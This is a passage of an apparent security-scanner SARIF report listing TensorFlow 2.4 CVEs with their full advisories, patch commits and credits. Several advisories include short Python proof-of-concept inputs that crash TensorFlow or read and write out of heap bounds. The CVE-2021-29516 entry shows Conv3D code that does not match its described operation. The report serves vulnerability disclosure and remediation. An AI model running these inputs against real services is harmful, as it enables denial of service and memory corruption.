              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29574",
              "help": {
                "text": "Vulnerability CVE-2021-29574\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29574](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29574)\n### Impact\nThe implementation of `tf.raw_ops.MaxPool3DGradGrad` exhibits undefined behavior by dereferencing null pointers backing attacker-supplied empty tensors:\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPool3DGradGrad(\n    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n    strides=strides, padding=padding)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/72fe792967e7fd25234342068806707bbc116618/tensorflow/core/kernels/pooling_ops_3d.cc#L679-L703) fails to validate that the 3 tensor inputs are not empty. If any of them is empty, then accessing the elements in the tensor results in dereferencing a null pointer.\n\n### Patches\nWe have patched the issue in GitHub commit [a3d9f9be9ac2296615644061b40cefcee341dcc4](https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29574**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29574](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29574)|\n\n### Impact\nThe implementation of `tf.raw_ops.MaxPool3DGradGrad` exhibits undefined behavior by dereferencing null pointers backing attacker-supplied empty tensors:\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPool3DGradGrad(\n    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n    strides=strides, padding=padding)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/72fe792967e7fd25234342068806707bbc116618/tensorflow/core/kernels/pooling_ops_3d.cc#L679-L703) fails to validate that the 3 tensor inputs are not empty. If any of them is empty, then accessing the elements in the tensor results in dereferencing a null pointer.\n\n### Patches\nWe have patched the issue in GitHub commit [a3d9f9be9ac2296615644061b40cefcee341dcc4](https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29563",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29563"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29563",
              "help": {
                "text": "Vulnerability CVE-2021-29563\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29563](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29563)\n### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from the implementation of `tf.raw_ops.RFFT`:\n    \n```python\nimport tensorflow as tf\n\ninputs = tf.constant([1], shape=[1], dtype=tf.float32)\nfft_length = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.RFFT(input=inputs, fft_length=fft_length)\n```\n\nThe above example causes Eigen code to operate on an empty matrix. This triggers on an assertion and causes program termination.\n    \n### Patches\nWe have patched the issue in GitHub commit [31bd5026304677faa8a0b77602c6154171b9aec1](https://github.com/tensorflow/tensorflow/commit/31bd5026304677faa8a0b77602c6154171b9aec1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29563**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29563](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29563)|\n\n### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from the implementation of `tf.raw_ops.RFFT`:\n    \n```python\nimport tensorflow as tf\n\ninputs = tf.constant([1], shape=[1], dtype=tf.float32)\nfft_length = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.RFFT(input=inputs, fft_length=fft_length)\n```\n\nThe above example causes Eigen code to operate on an empty matrix. This triggers on an assertion and causes program termination.\n    \n### Patches\nWe have patched the issue in GitHub commit [31bd5026304677faa8a0b77602c6154171b9aec1](https://github.com/tensorflow/tensorflow/commit/31bd5026304677faa8a0b77602c6154171b9aec1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29599",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29599"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29599",
              "help": {
                "text": "Vulnerability CVE-2021-29599\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29599](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29599)\n### Impact\nThe implementation of the `Split` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/e2752089ef7ce9bcf3db0ec618ebd23ea119d0c7/tensorflow/lite/kernels/split.cc#L63-L65):\n\n```cc\nTF_LITE_ENSURE_MSG(context, input_size % num_splits == 0, \"Not an even split\");\nconst int slice_size = input_size / num_splits;\n```\n\nAn attacker can craft a model such that `num_splits` would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d](https://github.com/tensorflow/tensorflow/commit/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. ",
                "markdown": "**Vulnerability CVE-2021-29599**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29599](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29599)|\n\n### Impact\nThe implementation of the `Split` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/e2752089ef7ce9bcf3db0ec618ebd23ea119d0c7/tensorflow/lite/kernels/split.cc#L63-L65):\n\n```cc\nTF_LITE_ENSURE_MSG(context, input_size % num_splits == 0, \"Not an even split\");\nconst int slice_size = input_size / num_splits;\n```\n\nAn attacker can craft a model such that `num_splits` would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d](https://github.com/tensorflow/tensorflow/commit/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. "
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29516",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29516"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29516",
              "help": {
                "text": "Vulnerability CVE-2021-29516\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29516](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29516)\n### Impact\nCalling `tf.raw_ops.RaggedTensorToVariant` with arguments specifying an invalid ragged tensor results in a null pointer dereference:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding=`VALID`, data_format=`NDHWC`, dilations=[1, 1, 1, 23, 1])\n```\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding=`VALID`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n\nThe implementation of [`RaggedTensorToVariant` operations](https://github.com/tensorflow/tensorflow/blob/904b3926ed1c6c70380d5313d282d248a776baa1/tensorflow/core/kernels/ragged_tensor_to_variant_op.cc#L39-L40) does not validate that the ragged tensor argument is non-empty:\n\n```cc\n  int ragged_rank = batched_ragged.ragged_rank();\n  auto batched_splits_top_vec = batched_ragged.splits(0).vec\u003cSPLIT_TYPE\u003e();\n```\n\nSince `batched_ragged` contains no elements, `batched_ragged.splits` is a null vector, thus `batched_ragged.splits(0)` will result in  dereferencing `nullptr`.\n\n### Patches\nWe have patched the issue in GitHub commit [b055b9c474cd376259dde8779908f9eeaf097d93](https://github.com/tensorflow/tensorflow/commit/b055b9c474cd376259dde8779908f9eeaf097d93).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29516**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29516](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29516)|\n\n### Impact\nCalling `tf.raw_ops.RaggedTensorToVariant` with arguments specifying an invalid ragged tensor results in a null pointer dereference:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 56, 56, 1], padding=`VALID`, data_format=`NDHWC`, dilations=[1, 1, 1, 23, 1])\n```\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)\nfilter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)\n\ntf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding=`VALID`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n\nThe implementation of [`RaggedTensorToVariant` operations](https://github.com/tensorflow/tensorflow/blob/904b3926ed1c6c70380d5313d282d248a776baa1/tensorflow/core/kernels/ragged_tensor_to_variant_op.cc#L39-L40) does not validate that the ragged tensor argument is non-empty:\n\n```cc\n  int ragged_rank = batched_ragged.ragged_rank();\n  auto batched_splits_top_vec = batched_ragged.splits(0).vec\u003cSPLIT_TYPE\u003e();\n```\n\nSince `batched_ragged` contains no elements, `batched_ragged.splits` is a null vector, thus `batched_ragged.splits(0)` will result in  dereferencing `nullptr`.\n\n### Patches\nWe have patched the issue in GitHub commit [b055b9c474cd376259dde8779908f9eeaf097d93](https://github.com/tensorflow/tensorflow/commit/b055b9c474cd376259dde8779908f9eeaf097d93).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29609",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29609"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29609",
              "help": {
                "text": "Vulnerability CVE-2021-29609\nSeverity: medium\nFixed Version: 2.4.2\nLink: [CVE-2021-29609](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29609)\n### Impact\nIncomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\na_indices = tf.zeros([10, 97], dtype=tf.int64)\na_values = tf.zeros([10], dtype=tf.int64)\na_shape = tf.zeros([0], dtype=tf.int64)\n\nb_indices = tf.zeros([0, 0], dtype=tf.int64)\nb_values = tf.zeros([0], dtype=tf.int64)\nb_shape = tf.zeros([0], dtype=tf.int64)\n  \nthresh = 0\n\ntf.raw_ops.SparseAdd(a_indices=a_indices,\n                    a_values=a_values,\n                    a_shape=a_shape,\n                    b_indices=b_indices,\n                    b_values=b_values,\n                    b_shape=b_shape,\n                    thresh=thresh)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/sparse_add_op.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.\n\n### Patches\nWe have patched the issue in GitHub commit [6fd02f44810754ae7481838b6a67c5df7f909ca3](https://github.com/tensorflow/tensorflow/commit/6fd02f44810754ae7481838b6a67c5df7f909ca3) followed by GitHub commit  [41727ff06111117bdf86b37db198217fd7a143cc](https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29609**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.4.2|[CVE-2021-29609](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29609)|\n\n### Impact\nIncomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\na_indices = tf.zeros([10, 97], dtype=tf.int64)\na_values = tf.zeros([10], dtype=tf.int64)\na_shape = tf.zeros([0], dtype=tf.int64)\n\nb_indices = tf.zeros([0, 0], dtype=tf.int64)\nb_values = tf.zeros([0], dtype=tf.int64)\nb_shape = tf.zeros([0], dtype=tf.int64)\n  \nthresh = 0\n\ntf.raw_ops.SparseAdd(a_indices=a_indices,\n                    a_values=a_values,\n                    a_shape=a_shape,\n                    b_indices=b_indices,\n                    b_values=b_values,\n                    b_shape=b_shape,\n                    thresh=thresh)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/sparse_add_op.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.\n\n### Patches\nWe have patched the issue in GitHub commit [6fd02f44810754ae7481838b6a67c5df7f909ca3](https://github.com/tensorflow/tensorflow/commit/6fd02f44810754ae7481838b6a67c5df7f909ca3) followed by GitHub commit  [41727ff06111117bdf86b37db198217fd7a143cc](https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "5.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-29588",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29588"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29588",
              "help": {
                "text": "Vulnerability CVE-2021-29588\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29588](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29588)\n### Impact\nThe optimized implementation of the `TransposeConv` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/internal/optimized/optimized_ops.h#L5221-L5222):\n\n```cc \nint height_col = (height + pad_t + pad_b - filter_h) / stride_h + 1;\nint width_col = (width + pad_l + pad_r - filter_w) / stride_w + 1;\n```\n\nAn attacker can craft a model such that `stride_{h,w}` values are 0. Code calling this function must validate these arguments.\n\n### Patches\nWe have patched the issue in GitHub commit [801c1c6be5324219689c98e1bd3e0ca365ee834d](https://github.com/tensorflow/tensorflow/commit/801c1c6be5324219689c98e1bd3e0ca365ee834d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29588**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29588](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29588)|\n\n### Impact\nThe optimized implementation of the `TransposeConv` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/internal/optimized/optimized_ops.h#L5221-L5222):\n\n```cc \nint height_col = (height + pad_t + pad_b - filter_h) / stride_h + 1;\nint width_col = (width + pad_l + pad_r - filter_w) / stride_w + 1;\n```\n\nAn attacker can craft a model such that `stride_{h,w}` values are 0. Code calling this function must validate these arguments.\n\n### Patches\nWe have patched the issue in GitHub commit [801c1c6be5324219689c98e1bd3e0ca365ee834d](https://github.com/tensorflow/tensorflow/commit/801c1c6be5324219689c98e1bd3e0ca365ee834d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29553",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29553"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29553",
              "help": {
                "text": "Vulnerability CVE-2021-29553\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29553](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29553)\n### Impact\nAn attacker can read data outside of bounds of heap allocated buffer in `tf.raw_ops.QuantizeAndDequantizeV3`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV3(\n  input=[2.5,2.5], input_min=[0,0], input_max=[1,1], num_bits=[30],\n  signed_input=False, range_given=False, narrow_range=False, axis=3)\n```   \n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/11ff7f80667e6490d7b5174aa6bf5e01886e770f/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L237) does not validate the value of user supplied `axis` attribute before using it to index in the array backing the `input` argument:\n\n```cc\nconst int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [99085e8ff02c3763a0ec2263e44daec416f6a387](https://github.com/tensorflow/tensorflow/commit/99085e8ff02c3763a0ec2263e44daec416f6a387).\n  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29553**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29553](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29553)|\n\n### Impact\nAn attacker can read data outside of bounds of heap allocated buffer in `tf.raw_ops.QuantizeAndDequantizeV3`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV3(\n  input=[2.5,2.5], input_min=[0,0], input_max=[1,1], num_bits=[30],\n  signed_input=False, range_given=False, narrow_range=False, axis=3)\n```   \n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/11ff7f80667e6490d7b5174aa6bf5e01886e770f/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L237) does not validate the value of user supplied `axis` attribute before using it to index in the array backing the `input` argument:\n\n```cc\nconst int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [99085e8ff02c3763a0ec2263e44daec416f6a387](https://github.com/tensorflow/tensorflow/commit/99085e8ff02c3763a0ec2263e44daec416f6a387).\n  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29578",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29578"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29578",
              "help": {
                "text": "Vulnerability CVE-2021-29578\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29578](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29578)\n### Impact\nThe implementation of `tf.raw_ops.FractionalAvgPoolGrad` is vulnerable to a heap buffer overflow:\n  \n```python\nimport tensorflow as tf\n\norig_input_tensor_shape = tf.constant([1, 3, 2, 3], shape=[4], dtype=tf.int64)\nout_backprop = tf.constant([2], shape=[1, 1, 1, 1], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\ncol_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\n\n\ntf.raw_ops.FractionalAvgPoolGrad(\n  orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/dcba796a28364d6d7f003f6fe733d82726dda713/tensorflow/core/kernels/fractional_avg_pool_op.cc#L216) fails to validate that the pooling sequence arguments have enough elements as required by the `out_backprop` tensor shape.\n\n### Patches\nWe have patched the issue in GitHub commit [12c727cee857fa19be717f336943d95fca4ffe4f](https://github.com/tensorflow/tensorflow/commit/12c727cee857fa19be717f336943d95fca4ffe4f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29578**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29578](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29578)|\n\n### Impact\nThe implementation of `tf.raw_ops.FractionalAvgPoolGrad` is vulnerable to a heap buffer overflow:\n  \n```python\nimport tensorflow as tf\n\norig_input_tensor_shape = tf.constant([1, 3, 2, 3], shape=[4], dtype=tf.int64)\nout_backprop = tf.constant([2], shape=[1, 1, 1, 1], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\ncol_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\n\n\ntf.raw_ops.FractionalAvgPoolGrad(\n  orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/dcba796a28364d6d7f003f6fe733d82726dda713/tensorflow/core/kernels/fractional_avg_pool_op.cc#L216) fails to validate that the pooling sequence arguments have enough elements as required by the `out_backprop` tensor shape.\n\n### Patches\nWe have patched the issue in GitHub commit 